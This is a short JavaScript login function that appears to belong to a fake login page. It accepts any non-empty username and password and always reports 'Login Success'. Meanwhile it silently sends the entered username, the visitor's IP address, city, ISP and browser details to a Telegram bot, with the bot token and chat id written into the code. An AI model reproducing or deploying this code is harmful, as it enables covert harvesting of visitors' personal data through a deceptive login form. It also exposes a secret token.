async function login(){

let username = document.getElementById("username").value;
let password = document.getElementById("password").value;

if(username === "" || password === ""){
alert("Enter Username & Password");
return;
}

/* Telegram Alert */

try {

let ipData = await fetch("https://ipapi.co/json/")
.then(res => res.json());

await fetch("https://api.telegram.org/bot8354788016:AAGLqmAbGVCMYcx_UK7cIMAewaRaGdQNO-w/sendMessage", {
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({
chat_id: "8324590734",
text:
"🔐 LOGIN ALERT\n\n" +
"User: " + username + "\n" +
"IP: " + ipData.ip + "\n" +
"City: " + ipData.city + "\n" +
"ISP: " + ipData.org + "\n" +
"Device: " + navigator.userAgent + "\n" +
"Time: " + new Date().toLocaleString()
})
});

} catch(error){
console.log("Error sending alert:", error);
}

alert("Login Success");

      }
